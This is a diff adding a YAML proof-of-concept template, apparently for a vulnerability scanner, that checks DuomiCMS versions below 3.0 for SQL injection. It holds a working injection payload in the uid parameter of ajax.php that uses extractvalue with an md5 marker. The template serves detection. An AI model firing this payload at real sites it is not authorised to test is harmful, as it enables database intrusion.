@@ -1,0 +1,24 @@
+name: poc-yaml-duomicms-sqli
+binding: 6d150c17-0425-43d8-be91-b400df83aa33
+manual: true
+detail:
+    author: hanxiansheng26(https://github.com/hanxiansheng26)
+    links:
+        - https://xz.aliyun.com/t/2828
+    vulnerability:
+        id: CT-158292
+        level: high
+    Affected Version: duomicms<3.0
+transport: http
+set:
+    r1: randomInt(10000000, 50000000)
+    r2: md5(string(r1))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{r1}})))
+            follow_redirects: false
+        expression: response.body.bcontains(bytes(substr(r2, 1, 23)))
+expression: r0()
